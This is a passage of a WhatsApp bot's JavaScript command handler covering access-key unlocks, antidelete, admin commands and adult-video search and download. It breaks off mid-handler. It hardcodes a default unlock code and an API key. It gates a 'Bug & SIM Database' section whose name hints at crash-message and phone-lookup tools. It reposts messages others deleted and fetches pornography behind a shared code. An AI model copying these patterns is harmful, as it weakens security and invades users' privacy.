    try { if (fs.existsSync(_rkUnlockedFile)) _rkUnlocked = JSON.parse(fs.readFileSync(_rkUnlockedFile, 'utf-8')); } catch(e) {}
    const _rkWasUnlocked = _rkUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _rkSenderNum);
    if (!_rkWasUnlocked) return reply(`ℹ️ *You don't have 18+ access.*\nNothing to remove.`);
    _rkUnlocked = _rkUnlocked.filter(id => String(id).replace(/[^0-9]/g,'') !== _rkSenderNum);
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(_rkUnlockedFile, JSON.stringify(_rkUnlocked, null, 2));
    } catch(e) {}
    return reply(`✅ *18+ Access Removed!*\n🔒 Adult commands are now hidden from your menu.\nType *${prefix}addkey <code>* to unlock again.`);
}
break;

// ============ ADDKEY1 COMMAND (Bug & SIM Database unlock) ============
case 'addkey1': {
    const _bkSecretFile = './database/bug_secret.json';
    const _bkUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
    const _bkBannedFile = './database/bug_banned.json';

    const _bkSenderNum = (m.sender || '').split('@')[0].split(':')[0];

    let _bkBanned = [];
    try { if (fs.existsSync(_bkBannedFile)) _bkBanned = JSON.parse(fs.readFileSync(_bkBannedFile, 'utf-8')); } catch(e) {}
    const _bkIsBanned = _bkBanned.some(id => String(id).replace(/[^0-9]/g,'') === _bkSenderNum);
    if (_bkIsBanned) return reply(`🚫 *Access Denied*\nYou have been permanently banned from Bug & SIM Database section.`);

    if (!text) return reply(`🔑 *Usage:* ${prefix}addkey1 <code>\n\nBug & SIM Database section unlock karne ke liye admin se code maango.`);

    let _bkSecret = 'cyberbug2025';
    try { if (fs.existsSync(_bkSecretFile)) _bkSecret = JSON.parse(fs.readFileSync(_bkSecretFile, 'utf-8')).code || _bkSecret; } catch(e) {}

    if (text.trim() !== _bkSecret) return reply(`❌ *Wrong code!*\nAdmin se sahi Bug & SIM access code maango.`);

    let _bkUnlocked = [];
    try { if (fs.existsSync(_bkUnlockedFile)) _bkUnlocked = JSON.parse(fs.readFileSync(_bkUnlockedFile, 'utf-8')); } catch(e) {}

    const _bkAlreadyUnlocked = _bkUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _bkSenderNum);
    if (_bkAlreadyUnlocked) return reply(`✅ *Already Unlocked*\nAap ko Bug & SIM Database access already mil chuki hai.`);

    _bkUnlocked.push(_bkSenderNum);
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(_bkUnlockedFile, JSON.stringify(_bkUnlocked, null, 2));
    } catch(e) {}

    // FIX: Immediately update in-memory cache so bugmenu/simdatabase show up right away
    // Without this, user must wait up to 30min for cache to expire before menu updates
    try {
        if (!global._flagCache) global._flagCache = {};
        if (!Array.isArray(global._flagCache.bug)) global._flagCache.bug = [];
        if (!Array.isArray(global._flagCache.bugUnlocked)) global._flagCache.bugUnlocked = [];
        if (!global._flagCache.bug.some(id => String(id).replace(/[^0-9]/g,'') === _bkSenderNum)) {
            global._flagCache.bug.push(_bkSenderNum);
        }
        if (!global._flagCache.bugUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _bkSenderNum)) {
            global._flagCache.bugUnlocked.push(_bkSenderNum);
        }
    } catch(_ce) {}

    return reply(`✅ *Bug & SIM Database Access Unlocked!* 🐛🗄️\nAb aap ${prefix}bugmenu aur ${prefix}simdatabase commands use kar sakte hain.\nType *${prefix}removekey1* to remove access anytime.`);
}
break;

// ============ REMOVEKEY1 COMMAND ============
case 'removekey1': {
    const _rk1UnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
    const _rk1SenderNum = (m.sender || '').split('@')[0].split(':')[0];
    let _rk1Unlocked = [];
    try { if (fs.existsSync(_rk1UnlockedFile)) _rk1Unlocked = JSON.parse(fs.readFileSync(_rk1UnlockedFile, 'utf-8')); } catch(e) {}
    const _rk1WasUnlocked = _rk1Unlocked.some(id => String(id).replace(/[^0-9]/g,'') === _rk1SenderNum);
    if (!_rk1WasUnlocked) return reply(`ℹ️ *Aap ke paas Bug & SIM Database access nahi hai.*\nKuch remove karne ki zaroorat nahi.`);
    _rk1Unlocked = _rk1Unlocked.filter(id => String(id).replace(/[^0-9]/g,'') !== _rk1SenderNum);
    try {
        if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true });
        fs.writeFileSync(_rk1UnlockedFile, JSON.stringify(_rk1Unlocked, null, 2));
    } catch(e) {}
    // FIX: Immediately remove from in-memory cache so lock takes effect right away
    try {
        if (global._flagCache) {
            if (Array.isArray(global._flagCache.bug))
                global._flagCache.bug = global._flagCache.bug.filter(id => String(id).replace(/[^0-9]/g,'') !== _rk1SenderNum);
            if (Array.isArray(global._flagCache.bugUnlocked))
                global._flagCache.bugUnlocked = global._flagCache.bugUnlocked.filter(id => String(id).replace(/[^0-9]/g,'') !== _rk1SenderNum);
        }
    } catch(_ce) {}
    return reply(`✅ *Bug & SIM Database Access Removed!*\n🔒 Commands ab lock ho gaye.\nType *${prefix}addkey1 <code>* to unlock again.`);
}
break;

// ============ ANTIDELETE COMMAND ============
case 'antidelete':
case 'antidel':
case 'adel': {
    if (isSettingsLocked() && !isCreator) return reply('🔒 *Settings are locked by owner*');
    const _adCfgBotNum = jidToNum(getBotJid(devtrust));
    const _adCfgNow = loadAntideleteCfg(_adCfgBotNum);
    const _adCurrentMode = _adCfgNow.mode || 'off';
    const _adAction = args[0]?.toLowerCase();
    const _adModeLabel = {
        'private': '🔒 private — ALL deletions (groups + PMs) → saved messages',
        'private_pm': '🔒 private_pm — PM/DM deletions only → saved messages',
        'private_groups': '🔒 private_groups — Group deletions only → saved messages',
        'chat': '💬 chat — ALL deletions → reposted in same chat',
        'chat_groups': '💬 chat_groups — Group deletions only → reposted in chat',
        'off': '❌ off — Disabled'
    };
    if (!_adAction) {
        return reply(
            `*🔰 ANTIDELETE SETTINGS 🔰*\n\n` +
            `*Current Mode:* ${_adModeLabel[_adCurrentMode] || _adCurrentMode}\n\n` +
            `*Delivery to saved messages (message myself):*\n` +
            `• \`${prefix}antidelete private\` — ALL deletions (groups + PMs) → saved messages\n` +
            `• \`${prefix}antidelete private_pm\` — PM/DM deletions only → saved messages\n` +
            `• \`${prefix}antidelete private_groups\` — Group deletions only → saved messages\n\n` +
            `*Delivery back into chat:*\n` +
            `• \`${prefix}antidelete chat\` — ALL deletions → reposted in same chat\n` +
            `• \`${prefix}antidelete chat_groups\` — Group deletions only → reposted in chat\n\n` +
            `• \`${prefix}antidelete off\` — Disable\n\n` +
            `_Note: Status deletions use_ \`statusantidelete\`\n\n` +
            `*Features:*\n` +
            `• Track deleted messages (text + media)\n` +
            `• Save deleted images/video/audio/stickers`
        );
    }
    const _adValidModes = ['private', 'private_pm', 'private_groups', 'chat', 'chat_groups', 'off'];
    if (!_adValidModes.includes(_adAction)) {
        return reply(`❌ Invalid mode.\n\nValid: private, private_pm, private_groups, chat, chat_groups, off`);
    }
    const _adSaveBotNum = jidToNum(getBotJid(devtrust));
    saveAntideleteCfg({ mode: _adAction }, _adSaveBotNum);
    return reply(`✅ *Antidelete set to:* ${_adModeLabel[_adAction]}`);
}
break;

case 'add': {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!m.isGroup) return reply("👥 *Groups only*");

    let users = m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await devtrust.groupParticipantsUpdate(m.chat, [users], 'add');
    reply("✅ *User added to group*");
}
break;

case 'setpp': {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!quoted || !/image/.test(mime)) return reply(`🖼️ *Reply to an image with ${prefix}setpp*`);
    
    let media = await quoted.download();
    await devtrust.updateProfilePicture(botNumber, media);
    reply('✅ *Profile picture updated*');
}
break;

case 'react-ch': 
case 'reactbcnch': {
    if (!isCreator) return reply(`🔒 *Owner only*`);

    if (!args[0]) {
        return reply("📌 *Usage:* reactch https://whatsapp.com/channel/... Robin");
    }

    if (!args[0].startsWith("https://whatsapp.com/channel/")) {
        return reply("❌ *Invalid channel link*");
    }

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const emojiInput = args.slice(1).join(' ');
    const emoji = emojiInput.split('').map(c => {
        if (c === ' ') return '―';
        const lower = c.toLowerCase();
        return hurufGaya[lower] || c;
    }).join('');

    try {
        const link = args[0];
        const channelId = link.split('/')[4];
        const messageId = link.split('/')[5];

        const res = await devtrust.newsletterMetadata("invite", channelId);
        await devtrust.newsletterReactMessage(res.id, messageId, emoji);

        reply(`✅ *Reacted* ${emoji} in channel ${res.name}`);
    } catch (e) {
        console.error(e);
        reply("❌ *Failed to send reaction*");
    }
}
break;

case "gpt4": {
    const chatId = m.key.remoteJid;
    let query = args.join(" ").trim();
    
    try {
        if (!query && m.message && m.message.extendedTextMessage && 
            m.message.extendedTextMessage.contextInfo && 
            m.message.extendedTextMessage.contextInfo.quotedMessage) {
            
            const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
            if (quoted.conversation) query = quoted.conversation;
            else if (quoted.extendedTextMessage && quoted.extendedTextMessage.text) 
                query = quoted.extendedTextMessage.text;
        }

        if (!query) {
            return reply("🤖 *Usage:* gpt4 your question");
        }

        const res = await fetch(`https://text.pollinations.ai/${encodeURIComponent('You are a helpful assistant. User: ' + query)}`);
        if (!res.ok) return reply(`⚠️ *API error* • ${res.status}`);

        const json = await res.json();
        const answer = json?.data || "";

        if (!answer) return reply("⚠️ *No response from GPT-4*");

        const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];
        
        for (let i = 0; i < chunks.length; i++) {
            const header = i === 0 ? "🤖 *GPT-4*\n\n" : "";
            await devtrust.sendMessage(chatId, { text: header + chunks[i] });
        }
    } catch (err) {
        console.error("gpt4 command error:", err);
        reply("⚠️ *GPT-4 unavailable* • Try later");
    }
}
break;

case 'mode': {
    reply(`🔹 *Mode:* ${devtrust.public ? 'Public' : 'Private'}`);
}
break;

case 'ping':
case 'speed': {
    const _t1 = process.hrtime.bigint();
    const _t2 = process.hrtime.bigint();
    const latensi = Number(_t2 - _t1) / 1e6; // nanoseconds → ms
    reply(`⚡ *CYBER Ping*\n\n📡 ${latensi.toFixed(4)} ms`);
}
break;

case 'runtime':
case 'alive': {
    reply(`⚡ *CYBER Uptime*\n\n⏱️ ${runtime(process.uptime())}`);
}
break;

case 'checkapis': {
    if (!isCreator) return reply("🔒 *Owner only*");
    await reply("🔍 *Checking all APIs... please wait*");

    const _apis = [
        { name: 'nekos.best (anime images)',  url: 'https://nekos.best/api/v2/waifu?amount=1' },
        { name: 'nekos.best (fallback)',       url: 'https://nekos.best/api/v2/waifu?amount=1' },
        { name: 'ryzendesu.vip (AI/tools)',    url: 'https://api.ryzendesu.vip/api/ai/chatgpt?text=hi' },
        { name: 'catapi (cat images)',         url: 'https://api.thecatapi.com/v1/images/search' },
        { name: 'dogapi (dog images)',         url: 'https://dog.ceo/api/breeds/image/random' },
        { name: 'openweather (weather)',       url: 'https://wttr.in/Karachi?format=j1' },
        { name: 'nekos.best GIF (animekill)',  url: 'https://nekos.best/api/v2/shoot?amount=1' },
        { name: 'nekos.best (anime alt)',      url: 'https://nekos.best/api/v2/neko?amount=1' },
    ];

    const _results = await Promise.all(_apis.map(async ({ name, url }) => {
        const _start = Date.now();
        try {
            const _res = await axios.get(url, { timeout: 7000 });
            const _ms = Date.now() - _start;
            const _ok = _res.status >= 200 && _res.status < 300;
            return `${_ok ? '✅' : '⚠️'} *${name}*\n   └ ${_res.status} • ${_ms}ms`;
        } catch (_e) {
            const _ms = Date.now() - _start;
            return `❌ *${name}*\n   └ ${_e.code || _e.message} • ${_ms}ms`;
        }
    }));

    const _report = `🛰️ *CYBER API Status Report*\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        _results.join('\n') +
        `\n━━━━━━━━━━━━━━━━━━━━\n` +
        `🕒 Checked at ${new Date().toLocaleTimeString('en-PK', { timeZone: 'Asia/Karachi' })}`;

    await reply(_report);
}
break;

case 'public': {
    devtrust.public = true;
    const _modeNumPub = botNumber ? botNumber.replace(/[^0-9]/g, '') : '';
    // Save to DB (MongoDB + PostgreSQL both supported now)
    try {
        const { setBotMode } = require('./server/db-service');
        if (_modeNumPub) setBotMode(_modeNumPub, 'public').catch(() => {});
    } catch (_) {}
    // Also save to local file (for local dev / fallback)
    try {
        const _fsMode = require('fs');
        if (_modeNumPub) _fsMode.writeFileSync('./database/bot_mode_' + _modeNumPub + '.json', JSON.stringify({ mode: 'public' }));
    } catch (_) {}
    reply(`🌍 *Public mode activated*\nEveryone can use the bot`);
}
break;

case 'private':
case 'self': {
    devtrust.public = false;
    const _modeNumSelf = botNumber ? botNumber.replace(/[^0-9]/g, '') : '';
    // Save to DB (MongoDB + PostgreSQL both supported now)
    try {
        const { setBotMode } = require('./server/db-service');
        if (_modeNumSelf) setBotMode(_modeNumSelf, 'self').catch(() => {});
    } catch (_) {}
    // Also save to local file (for local dev / fallback)
    try {
        const _fsMode = require('fs');
        if (_modeNumSelf) _fsMode.writeFileSync('./database/bot_mode_' + _modeNumSelf + '.json', JSON.stringify({ mode: 'self' }));
    } catch (_) {}
    reply(`🔐 *Private mode activated*\nOnly bot owner & bot number can use the bot`);
    break;
}

case 'readmore': {
    const more = String.fromCharCode(8206);
    const readmore = more.repeat(4001);
    
    let [leftText, rightText] = text.split('|');
    if (!leftText) leftText = '';
    if (!rightText) rightText = '';
    
    const fullText = leftText + readmore + rightText;
    
    devtrust.sendMessage(m.chat, { text: fullText }, { quoted: m });
    break;
}

case "banuser1": 
case "banuser": {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] ? m.mentionedJid[0] : 
                    text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : 
                    m.quoted ? m.quoted.sender : '';
        
        if (global.banned[orang]) return reply(`⚠️ *User already banned*`);
        
        global.banned[orang] = true;
        
        // Save to file
        try {
            fs.writeFileSync("./database/banned.json", JSON.stringify(global.banned));
        } catch (e) {
            console.log("Error saving banned.json:", e);
        }
        
        reply(`🚫 *User @${orang.split('@')[0]} banned*`, [orang]);
    } else {
        return reply("👤 *Tag or reply to user*");
    }
}
break;

case "unbanuser1": 
case "unbanuser": {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] ? m.mentionedJid[0] : 
                    text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : 
                    m.quoted ? m.quoted.sender : '';
        
        if (!global.banned[orang]) return reply(`⚠️ *User not in ban list*`);
        
        delete global.banned[orang];
        
        // Save to file
        try {
            fs.writeFileSync("./database/banned.json", JSON.stringify(global.banned));
        } catch (e) {
            console.log("Error saving banned.json:", e);
        }
        
        reply(`✅ *User @${orang.split('@')[0]} unbanned*`, [orang]);
    } else {
        return reply("👤 *Tag or reply to user*");
    }
}
break;

case "listban": 
case "listbanuser": {
    if (!isCreator) return reply("🔒 *Owner only*");
    
    // Get all users where banned is true
    const bannedUsers = Object.keys(global.banned).filter(jid => global.banned[jid] === true);
    
    if (bannedUsers.length < 1) return reply("📭 *No banned users*");
    
    let teksnya = `🚫 *Banned Users*\n\n`;
    bannedUsers.forEach(jid => teksnya += `• @${jid.split("@")[0]}\n`);
    
    await devtrust.sendMessage(m.chat, {
        text: teksnya,
        mentions: bannedUsers
    }, { quoted: m });
}
break;

case 'git': 
case 'gitclone': {
    if (!args[0]) return reply(`🔗 *Usage:* ${prefix}${command} https://github.com/...`);
    if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`❌ *Invalid GitHub link*`);
    
    let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i;
    let [, user, repo] = args[0].match(regex1) || [];
    repo = repo.replace(/.git$/, '');
    
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`;
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1];
    
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({
            document: { url: url },
            fileName: filename + '.zip',
            mimetype: 'application/zip'
        }),
        { quoted: m }
    );
} 
break;

case 'coffee': 
case 'kopi': {
    devtrust.sendMessage(m.chat,
        addNewsletterContext({
            image: { url: 'https://coffee.alexflipnote.dev/random' },
            caption: "☕ *Fresh Coffee*"
        }),
        { quoted: m }
    );
} 
break;

case 'gxhxhxh': 
case 'styletext': {
    if (!text) return reply(`✏️ *Example:* styletext Hello`);
    
    let anu = await styletext(text);
    let teks = `🎨 *Style Text*\n\n"${text}"\n\n`;
    
    for (let i = 0; i < anu.length; i++) {
        teks += `${i + 1}. ${anu[i].name} : ${anu[i].result}\n\n`;
    }
    
    await reply(teks);
} 
break;
  case 'xvideos': {
    // 18+ unlock check
    const _xvid_num = (m.sender || '').split('@')[0].split(':')[0];
    const _xvid_unlocked = (global._flagCache?.adultUnlocked || []).some(id => String(id).replace(/[^0-9]/g,'') === _xvid_num);
    const _xvid_banned = (global._flagCache?.adultBanned || []).some(id => String(id).replace(/[^0-9]/g,'') === _xvid_num);
    if (_xvid_banned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_xvid_unlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
    if (!text) return reply(`🔞 *XVideos Search & Download*\n\nUsage: ${prefix}xvideos [search query]\nExample: ${prefix}xvideos step mom`);

    await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
    try {
        const searchRes = await axios.get(`https://api.princetechn.com/api/search/xvideossearch?apikey=prince&query=${encodeURIComponent(text)}`, { timeout: 20000 });
        const searchData = searchRes.data;

        if (!searchData.success || !searchData.results?.length) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ *"${text}"* se koi result nahi mila. Koi aur search karo.`);
        }

        const results = searchData.results.slice(0, 8);
        const menuText = results.map((v, i) =>
            `*${i + 1}.* ${v.title.substring(0, 60)}\n    ⏱️ ${v.duration || 'N/A'}`
        ).join('\n\n');

        const sentMsg = await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                image: { url: results[0].thumb },
                caption: `🔞 *XVideos Search Results*\n🔎 Query: *${text}*\n\n${menuText}\n\n📌 *Number reply karo download ke liye*`
            }),
            { quoted: m }
        );

        const _xvHandler = async (msgUpdate) => {
            try {
                const msg = msgUpdate?.messages[0];
                if (!msg?.message) return;
                const replyTxt = (msg.message.extendedTextMessage?.text || msg.message.conversation || '').trim();
                const stanzaId = msg.message.extendedTextMessage?.contextInfo?.stanzaId;
                if (stanzaId !== sentMsg?.key?.id) return;

                const num = parseInt(replyTxt);
                if (isNaN(num) || num < 1 || num > results.length) return;

                devtrust.ev.off('messages.upsert', _xvHandler);
                await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: msg.key } });

                const chosen = results[num - 1];
                await devtrust.sendMessage(m.chat, { text: `⬇️ Downloading: *${chosen.title.substring(0, 50)}*\nPlease wait...` }, { quoted: msg });

                // Get download link
                const dlRes = await axios.get(`https://api.princetechn.com/api/download/xvideosdl?apikey=prince&url=${encodeURIComponent(chosen.url)}`, { timeout: 30000 });
                const dlData = dlRes.data;

                if (!dlData.success || !dlData.result?.download_url) {
                    throw new Error('Download link nahi mila');
                }

                const r = dlData.result;
                const videoCaption = `🎬 *${r.title || chosen.title}*\n👁️ ${r.views || 'N/A'} | 👍 ${r.likes || 'N/A'} | 👎 ${r.dislikes || 'N/A'}\n📦 Size: ${r.size || 'N/A'}`;

                // Download buffer then send as actual file
                const videoBuf = Buffer.from((await axios.get(r.download_url, {
                    responseType: 'arraybuffer',
                    headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
                    timeout: 300000,
                    maxContentLength: 500 * 1024 * 1024
                })).data);

                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({ video: videoBuf, caption: videoCaption, mimetype: 'video/mp4' }),
                    { quoted: msg }
                );
                await devtrust.sendMessage(m.chat, { react: { text: '✅', key: msg.key } });

            } catch (e) {
                console.error('xvideos handler error:', e.message);
                await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                reply(`❌ *Download failed:* ${e.message}`);
            }
        };

        devtrust.ev.on('messages.upsert', _xvHandler);
        setTimeout(() => devtrust.ev.off('messages.upsert', _xvHandler), 120000);

    } catch (e) {
        console.error('xvideos search error:', e.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *XVideos Search failed:* ${e.message}`);
    }
}
break;

  case "xvideodl": {
  if (!isCreator) return reply("Owner only"); 
if (!text) return m.reply(example(`xvideo link`))
// Check if link is from xvideo
if (!text.includes("xvideos.com")) return m.reply("Link is not from xvideos.com")
await devtrust.sendMessage(m.chat, {react: {text: '🍑', key: m.key}})
// Fetching video data from API
try {
let res = await fetch(`https://api.agatz.xyz/api/xvideodown?url=${encodeURIComponent(text)}`);
let json = await res.json();

// Bad response from API
if (json.status !== 200 || !json.data) {
throw "Cannot find video for this URL.";
}

// Retrieving video information from API
let videoData = json.data;

// Download videos using URLs obtained from API
const videoUrl = videoData.url;
const videoResponse = await fetch(videoUrl);

// Check if the video was downloaded successfully
if (!videoResponse.ok) {
throw "Failed to download video.";
}

// Send video
await devtrust.sendMessage(m.chat, {
video: {
url: videoUrl,
},
caption: `*Title:* ${videoData.title || 'No title'}\n` +
`*Views:* ${videoData.views || 'No view information'}\n` +
`*Votes:* ${videoData.vote || 'No vote information'}\n` +
`*Likes:* ${videoData.like_count || 'No like information'}\n` +
`*Dislikes:* ${videoData.dislike_count || 'No dislike information'}`,
});
await devtrust.sendMessage(m.chat, {react: {text: '', key: m.key}})
} catch (e) {
console.log(`Error downloading video: ${e}`);
}
}
break;
  case "xnxxvideodl": {
    if (!isCreator) return reply("🔒 *Owner only*");
    if (!text) return reply("📌 *Usage:* .xnxxvideodl <xnxx link>\nExample: .xnxxvideodl https://www.xnxx.com/video-xxx/...");
    if (!text.includes("xnxx.com")) return reply("❌ *Link must be from xnxx.com*");

    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    try {
        const xdata = await xnxxDownload(text);
        const videoUrl = xdata.best;
        if (!videoUrl) throw new Error('No video URL found');

        const caption = `🍑 *XNXX Download*\n\n` +
            `📽️ *Title:* ${xdata.title.slice(0, 100)}\n` +
            `🎬 *Quality:* ${xdata.sources.high ? 'High (360p)' : 'Low (240p)'}`;

        await devtrust.sendMessage(m.chat,
            addNewsletterContext({ video: { url: videoUrl }, mimetype: 'video/mp4', caption }),
            { quoted: m }
        );
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.error('xnxxvideodl error:', e.message);
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply(`❌ *Failed:* ${e.message}`);
    }
}
break;
case 'xvideosearch':{
    // 18+ unlock check
    const _xvsrch_num = (m.sender || '').split('@')[0].split(':')[0];
    const _xvsrch_unlocked = (global._flagCache?.adultUnlocked || []).some(id => String(id).replace(/[^0-9]/g,'') === _xvsrch_num);
    const _xvsrch_banned = (global._flagCache?.adultBanned || []).some(id => String(id).replace(/[^0-9]/g,'') === _xvsrch_num);
    if (_xvsrch_banned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_xvsrch_unlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
  if (!text) return reply(`🔍 *Usage:* ${prefix}xvideosearch <keyword>\nExample: ${prefix}xvideosearch milf`);
  try {
    reply(mess.wait);
    // Use PrinceTech API (same as xvideos command)
    const searchRes = await axios.get(
      `https://api.princetechn.com/api/search/xvideossearch?apikey=prince&query=${encodeURIComponent(text)}`,
      { timeout: 20000 }
    );
    const results = searchRes.data?.result || searchRes.data?.data || [];
    if (!results || results.length === 0) {
      return reply(`❌ *No results found for "${text}"*\nTry a different keyword.`);
    }
    const top = results.slice(0, 8);
    let message = `╭━━━━━━━━━━━━━━━╮\n`;
    message += `┃ 🍑 *XVIDEO SEARCH*\n`;
    message += `┃ 🔎 Query: ${text}\n`;
    message += `╰━━━━━━━━━━━━━━━╯\n\n`;
    top.forEach((v, i) => {
      message += `*${i + 1}.* ${v.title || v.name || 'No title'}\n`;
      message += `   ⏱️ ${v.duration || v.time || 'N/A'} | 👁️ ${v.views || 'N/A'}\n`;
      message += `   🔗 ${v.url || v.link || ''}\n\n`;
    });
    message += `_Type ${prefix}xvideos <URL> to download_`;
    await devtrust.sendMessage(m.chat, { text: message });
  } catch (e) {
    console.error('xvideosearch error:', e.message);
    reply(`❌ *Search failed* • Try again later`);
  }
}
break; 
// ✅ Command switch
case 'xnxxsearch': {
    // 18+ unlock check
    const _xnxxs_num = (m.sender || '').split('@')[0].split(':')[0];
    const _xnxxs_unlocked = (global._flagCache?.adultUnlocked || []).some(id => String(id).replace(/[^0-9]/g,'') === _xnxxs_num);
    const _xnxxs_banned = (global._flagCache?.adultBanned || []).some(id => String(id).replace(/[^0-9]/g,'') === _xnxxs_num);
    if (_xnxxs_banned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_xnxxs_unlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
    if (!text) return reply(`🔍 *Usage:* ${prefix}xnxxsearch <query>\nExample: ${prefix}xnxxsearch mia`);

    reply(mess.wait);
    try {
        const searchResults = await xnxxSearch(text);
        if (!searchResults || searchResults.length === 0) {
            return reply(`❌ No videos found for *${text}*`);
        }
        const topResults = searchResults.slice(0, 10);
        let listMessage = `╭━━━━━━━━━━━━━━━╮\n`;
        listMessage += `┃ 🎥 *XNXX SEARCH RESULTS*\n`;
        listMessage += `┃ 🔎 Query: ${text}\n`;
        listMessage += `╰━━━━━━━━━━━━━━━╯\n\n`;
        topResults.forEach((video, index) => {
            listMessage += `*${index + 1}.* ${video.title}\n   ⏱️ ${video.duration || 'N/A'}\n`;
        });
        reply(listMessage);
    } catch (e) {
        console.error('XNXX Search Error:', e);
        reply(`❌ *Search failed* • Try again later`);
    }
    break;
}  
case 'xnxx': {
    // Adult unlock check
    const _xnxxSenderNum = (m.sender || '').split('@')[0].split(':')[0];
    const _xnxxUnlocked = (global._flagCache?.adultUnlocked || []).some(id => String(id).replace(/[^0-9]/g,'') === _xnxxSenderNum);
    const _xnxxBanned = (global._flagCache?.adultBanned || []).some(id => String(id).replace(/[^0-9]/g,'') === _xnxxSenderNum);
    if (_xnxxBanned) return reply(`🚫 *18+ Access Permanently Banned*\nYou cannot access 18+ content.`);
    if (!_xnxxUnlocked) return reply(`🔞 *18+ Content Locked*\nType *${prefix}addkey <code>* to unlock.\nGet the code from admin.`);
    if (!text) {
        return reply('❌ Please enter a name.\n📌 Example: *.xnxx mia*');
    }
    if (!global.videoCache) global.videoCache = new Map();
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        const searchResults = await xnxxSearch(text);
        if (!searchResults || searchResults.length === 0) {
            await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
            return reply(`❌ No videos found for *${text}*`);
        }
        const topResults = searchResults.slice(0, 8);
        const captionLines = topResults.map((v, i) =>
            `*${i + 1}.* ${(v.title || 'Unknown').substring(0, 65)}\n    ⏱️ ${v.duration || 'N/A'}`
        ).join('\n\n');
        const listCaption = `🔞 *XNXX Search Results*\n🔎 Query: *${text}*\n\n${captionLines}\n\n📌 *Reply with number to download*`;
        // Send with thumbnail if available, else text
        const firstThumb = topResults.find(v => v.thumb)?.thumb;
        let listMsg;
        if (firstThumb) {
            try {
                listMsg = await devtrust.sendMessage(m.chat,
                    addNewsletterContext({ image: { url: firstThumb }, caption: listCaption }),
                    { quoted: m }
                );
            } catch (_) {
                listMsg = await devtrust.sendMessage(m.chat, { text: listCaption }, { quoted: m });
            }
        } else {
            listMsg = await devtrust.sendMessage(m.chat, { text: listCaption }, { quoted: m });
        }
        const sessionId = `${m.chat}_${listMsg.key.id}`;
        global.videoCache.set(sessionId, { videos: topResults, listMsgId: listMsg.key.id });
        const _xnxxHandler = async (messageUpdate) => {
            try {
                const messageData = messageUpdate?.messages?.[0];
                if (!messageData?.message) return;
                const fromChat = messageData.key.remoteJid;
                if (fromChat !== m.chat) return;
                const ctx = messageData.message.extendedTextMessage?.contextInfo;
                const stanzaId = ctx?.stanzaId;
                if (stanzaId !== listMsg.key.id) return;
                const replyText = (messageData.message.extendedTextMessage?.text || messageData.message.conversation || '').trim();
                const number = parseInt(replyText);
                const cached = global.videoCache.get(sessionId);
                if (!cached) {
                    devtrust.ev.off('messages.upsert', _xnxxHandler);
                    return;
                }
                if (isNaN(number) || number < 1 || number > cached.videos.length) {
                    await devtrust.sendMessage(fromChat, { react: { text: '⚠️', key: messageData.key } });
                    return;
                }
                const selectedVideo = cached.videos[number - 1];
                await devtrust.sendMessage(fromChat, { react: { text: '⏳', key: messageData.key } });
                try {
